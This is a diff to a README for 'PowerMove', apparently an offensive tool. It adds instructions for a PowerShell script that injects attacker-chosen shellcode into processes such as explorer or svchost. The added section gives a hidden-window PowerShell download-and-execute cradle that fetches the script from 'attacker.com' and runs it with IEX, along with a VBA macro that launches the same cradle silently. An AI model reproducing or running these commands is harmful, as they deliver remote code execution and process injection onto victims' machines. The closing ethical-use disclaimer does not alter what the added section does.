@@ -19,6 +19,33 @@ To use PowerMove in an existing PowerShell shell
 ## Output
 ![alt text](https://github.com/10N351R/PowerMove/blob/main/Images/PowerMove_output.png)
 
+# PowerMove_dynamic.ps1
+`PowerMove_dynamic.ps1` was created to add dynamic PID resolution to enable remote execution via COM objects without embedding.
+
+Tested on PowerShell version: `5.1.26100.4202`
+
+## Instructions
+`PowerMove_dynamic.ps1` can be executed in a Visual Basic for Applications (VBA) script, or directly from PowerShell.
+1. Copy the contents of `PowerMove_dynamic.ps1` into a text editor
+2. Edit the `$targetProcName` variable with the name of the process you want to target (eg. `notepad`,`explorer`,`svchost`)
+3. Edit the `$shellcode` variable with the payload you wish to inject
+4. Host `PowerMove_dynamic.ps1` on a server reachable by the target
+5. Execute on the target
+
+### Using Powershell
+```powershell
+powershell.exe -nop -w hidden -Command ""$h=New-Object -ComObject 'Msxml2.XMLHTTP';$h.open('GET','http://attacker.com/PowerMove_dynamic.ps1',$false);$h.send();IEX $h.responseText""
+```
+
+### Using VBA
+```vba
+Sub TEST()
+    Dim ps As String
+    ps = "powershell.exe -nop -w hidden -Command ""$h=New-Object -ComObject 'Msxml2.XMLHTTP';$h.open('GET','http://attacker.com/PowerMove_dynamic.ps1',$false);$h.send();IEX $h.responseText"""
+    Shell ps, vbHide
+End Sub
+```
+
 ## Disclaimer
 **Ethical Use:** PowerMove is provided for educational and lawful purposes only. The author is not responsible for any misuse or damaged caused by this tool. By using this tool, you agree to use it ethically and comply with all applicable laws and regulations. Unauthorized use of this tool is strictly prohibited and may result in severe legal consequences.
 
